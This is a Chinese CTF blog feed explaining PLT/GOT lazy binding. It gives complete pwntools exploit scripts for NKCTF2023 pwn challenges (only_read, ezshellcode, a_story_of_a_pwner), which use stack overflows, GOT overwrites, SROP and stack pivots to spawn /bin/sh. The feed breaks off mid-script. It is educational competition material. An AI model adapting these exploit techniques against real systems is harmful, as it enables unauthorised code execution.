        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常来说 我们想要通过A函数来调用B函数 最常用的办法是覆盖函数A的got表 </p><p>但是这种做法存在一种弊端 这里我们先不提及 在下面会逐渐揭示 我们先来了解一下函数的动态链接到底是怎么实现的</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>我们知道 对于一个c语言程序来说 其从.c文件编译成为一个可执行文件 一共需要四个步骤</p><p>分别是预处理 编译 汇编 链接 这里这把链接展开说</p><p>链接分为静态链接和动态链接 这里的静态动态是对于函数的调用来说的</p><p>静态链接出来的二进制文件通常是要大于动态链接的 是因为其包括了完整的静态库</p><p>而动态链接则是在程序运行时 再去通过操作系统自带的动态链接库索引</p><p>这种操作称之为延迟绑定 延迟绑定的实现主要是由plt表 got表 got.plt表这三个实现</p><p>全局偏移表是对got表和got.plt表的统称 其中got表存放供外部变量引用的地址 got.plt表则是延迟绑定利用的关键 存放外部函数引用的地址</p><p>got.plt表相当于一个数组 其固定拥有三个元素 从0到2分别占据数组 依次存放</p><p><code>dynamic</code>段的地址  本模块的ID <code>_dl_runtime_resolve</code>函数的地址</p><p><code>dynamic</code>段供动态链接器提取动调链接信息  ID则是用来索引不同的函数 dl_runtime_resolve负责解析出函数的真实地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282021996.png" title="image-20230328201900138" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282021996.png" alt="image-20230328201900138"></a></p><p>接下来看一下一个函数是如何进行延迟绑定 获取到真实地址的</p><p>对于一个函数来说 在其还没有被第一次调用前 其存储的是.plt表上的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282038421.png" title="image-20230328203845367" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282038421.png" alt="image-20230328203845367"></a></p><p>以puts函数为例</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282039406.png" title="image-20230328203922386" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282039406.png" alt="image-20230328203922386"></a></p><p>这里的0x0就是其模块ID 随后跳转到0x401020上</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282040896.png" title="image-20230328204011873" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282040896.png" alt="image-20230328204011873"></a></p><p>在这里索引到全局偏移表中的GOT[1] 在这里压入模块ID</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282041356.png" title="image-20230328204147337" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282041356.png" alt="image-20230328204147337"></a></p><p>随后通过<code>_dl_runtime_resolve</code>函数获取到真实地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282042050.png" title="image-20230328204228032" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282042050.png" alt="image-20230328204228032"></a></p><p>随后根据模块ID 放入GOT数组中对应位置</p><h2 id="实操演示"><a href="#实操演示" class="headerlink" title="实操演示"></a>实操演示</h2><p>上面说到过 通过覆盖got表来实现函数误导调用有一种弊端 就是在我们下面这种办法的利用中 必须选择延迟绑定的利用方法 跟着我来看一下吧</p><p>所选例题是NKCTF2023的only_read libc版本为2.31 9.9</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282057967.png" title="image-20230328205725939" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282057967.png" alt="image-20230328205725939"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;Welcome to NKCTF!&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;tell you a secret:&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;can you find me?&quot;</span>) )</span><br><span class="line">    next();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了不通过puts等输出函数来书写字符串 利用strcmp函数来对比base64加解密的字符串 这里就不解释了</p><p>来看一下next函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">next</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的栈溢出漏洞 但是难点在于说没有给任何的输出函数 也就是说没有办法泄露libc地址(实际上是可以的 覆盖got表爆破 但是这里不用这种办法)</p><p>这种情况极大程度上限制了我们的利用 不过还是可以通过Srop的方法来getshell</p><p>为了促成srop 我们就需要使得控制rax寄存器的值为15 随后syscall系统调用 但是这题没有直接给控制rax的指令 这个时候我们要联想到 大部分函数执行完都是有返回值的 而这个返回值就是用rax寄存器存储的 这里采用read函数来控制rax寄存器 那么syscall要如何解决呢 这题同样也是没有syscall函数的</p><p>不知道你有没有s进入read函数中看其是如何调用的 实际上read函数是通过syscall实现的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282117200.png" title="image-20230328211707161" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282117200.png" alt="image-20230328211707161"></a></p><p>同时注意一下 syscall和read函数的起始地址 只差在倒数第二位 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282123535.png" title="image-20230328212310508" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303282123535.png" alt="image-20230328212310508"></a></p><p>如果我们覆盖read函数的got表 执行read函数就相当于执行syscall 但是此时read函数也就相当于废掉了 相当于syscall了 我们还怎么利用read函数来控制rax寄存器呢</p><p>这个时候就用到延迟绑定了 我们直接把其他函数的got表改为read函数在plt表上的地址 这样就相当于再次延迟绑定一次 也就相当于调用了read函数  不过这样子会使得read函数的got表恢复为原来的值 需要我们重新留覆盖一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;ctf.comentropy.cn&quot;,8301)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;V2VsY29tZSB0byBOS0NURiE=&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(<span class="string">b&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(<span class="string">b&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(<span class="string">b&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000401683</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x0000000000401681</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">leave_addr = <span class="number">0x00000000004013c2</span></span><br><span class="line">next_addr = elf.sym[<span class="string">&#x27;next&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss(<span class="number">0x600</span>)</span><br><span class="line">rsp_r13_r14_r15_addr = <span class="number">0x000000000040167d</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(rdi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_r15_addr)+p64(elf.got[<span class="string">&#x27;memset&#x27;</span>])+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_r15_addr)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;memset&#x27;</span>])</span><br><span class="line">payload += p64(rsp_r13_r14_r15_addr)+p64(bss_addr-<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4013E8&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = p64(<span class="number">0x401050</span>)+<span class="string">b&#x27;\xd0&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rsi_r15_addr))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdi = bss_addr</span><br><span class="line">frame.rip = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(rdi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_r15_addr)+p64(elf.got[<span class="string">&#x27;memset&#x27;</span>]-<span class="number">0x6</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;memset&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rsp_r13_r14_r15_addr))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6</span>)+p64(<span class="number">0x401050</span>)+<span class="string">b&#x27;\xd0&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(elf.plt[&#x27;read&#x27;]))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023</title>
      <link href="/2023/03/26/NKCTF/"/>
      <url>/2023/03/26/NKCTF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>打的比较坐牢 主要还是有的题目没有给libc文件</p><p>题目质量还是挺不错的 扩展了思路</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>这题老熟人了哈哈 还记得刚开始学pwn的时候 写的第一篇wp就是猜数字 顺便这题真的被坑了一手 一开始没仔细看题目 看到随机数就以为时间当种子 爆破半天发现是固定种子 默认1</p><p>签到题 不解释了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./nk&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;u can make it in 5 min!&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">buf = libc.rand() % <span class="number">100</span> + <span class="number">1</span></span><br><span class="line">payload = cyclic(buf)+asm(shellcraft.sh())</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;good luck!&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262203725.png" title="image-20230326220255628" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262203725.png" alt="image-20230326220255628"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;today, I want to tell you some stories about myself.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a lot of stories, which one do you want to hear?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          <span class="keyword">if</span> ( opt != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          acm(&amp;v6);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ctf(&amp;v5);</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( opt != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      love(&amp;v4);</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opt != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &amp;&amp; v5 &amp;&amp; v4 )</span><br><span class="line">      heart();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      warning(&amp;v6, &amp;v5, &amp;v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wrong choice.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you hurt me so much.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;DO YOU THINK IT&#x27;S FUNNY TO CHOOSE INCORRECT OPTION?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;BYE.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始还以为是堆 跟进一下每个函数发现还是比较简单的</p><p>acm ctf love三个函数每个函数进去可以往bss段上写0x8字节的数据 并且这三个位置是相邻的</p><p>同时在函数执行完以后 会各自把一个值设置为1</p><p>接着要进入heart函数的分支有两种情况 一种是值都为1 也就是已经执行完3个函数了 还有一种就是没有全部执行完</p><p>跟进一下heart函数和warning函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">heart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;now, come and read my heart...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以溢出0x16字节 也就够个栈迁移了 联想到之前可以往bss段写数据 那就是往那边迁移了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">warning</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before u read this, i think u should read first 3.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;I give it up, you can see this. %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接送了puts函数的真实地址 那就好办了 接收一下 然后在bss段上构造system(“&#x2F;bin&#x2F;sh”) 随后迁移过去</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="meta">#io = remote(<span class="string">&quot;node.yuzhian.com.cn&quot;</span>,37719)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="meta">#libc = ELF(<span class="string">&quot;./刷题/libc-2.32.so&quot;</span>)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="meta">#libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/lib</span></span></span><br><span class="line"><span class="string"><span class="meta"># context.arch = &quot;i386&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">context.arch = &quot;amd64&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">elf = ELF(&quot;./nk&quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">def debug():</span></span></span><br><span class="line"><span class="string"><span class="meta">    gdb.attach(io)</span></span></span><br><span class="line"><span class="string"><span class="meta">    pause()</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;&gt; &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(b&#x27;</span>4<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;I give it up, you can see this. &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">puts_addr = int(io.recv(14),16)</span></span></span><br><span class="line"><span class="string"><span class="meta">success(&quot;puts_addr :&quot;+hex(puts_addr))</span></span></span><br><span class="line"><span class="string"><span class="meta">libc_addr = puts_addr - libc.sym[&#x27;</span>puts<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="meta">success(&quot;libc_addr :&quot;+hex(libc_addr))</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">rdi_addr = 0x0000000000401573</span></span></span><br><span class="line"><span class="string"><span class="meta">binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))</span></span></span><br><span class="line"><span class="string"><span class="meta">system_addr = libc_addr + libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="meta">leave_addr = 0x000000000040139e   </span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;&gt; &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(b&#x27;</span>2<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.send(p64(rdi_addr))</span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;&gt; &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(b&#x27;</span>1<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.send(p64(binsh_addr))</span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;&gt; &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(b&#x27;</span>3<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.send(p64(system_addr))</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">io.recvuntil(&quot;&gt; &quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(b&#x27;</span>4<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.recv()</span></span></span><br><span class="line"><span class="string"><span class="meta">io.recv()</span></span></span><br><span class="line"><span class="string"><span class="meta">onegadget_addr = libc_addr +0xe3b04</span></span></span><br><span class="line"><span class="string"><span class="meta">payload = cyclic(10)+p64(0x4050A0-8)+p64(leave_addr)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(payload)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.interactive()</span></span></span><br></pre></td></tr></table></figure><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262212550.png" title="image-20230326221210521" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262212550.png" alt="image-20230326221210521"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_write(<span class="number">1u</span>, nkctf, <span class="number">0x26</span>uLL);</span><br><span class="line">  v1 = sys_read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>隐约记得哪一年的国赛也有这种类型的题目 记得是srop来着 翻了翻之前的博客 发现还真是(所以写写博客还是有用的对吧) </p><p>ROPgadget看看能不能控制rax的值 果然发现了 那这一题就是srop了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262213516.png" title="image-20230326221335489" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262213516.png" alt="image-20230326221335489"></a></p><p>不过还需要找个地方写binsh字符串 所以先srop写一个read到bss段上 然后再getshell</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="meta">#io = remote(<span class="string">&quot;node.yuzhian.com.cn&quot;</span>,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="meta">#libc = ELF(<span class="string">&quot;./刷题/libc-2.32.so&quot;</span>)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span 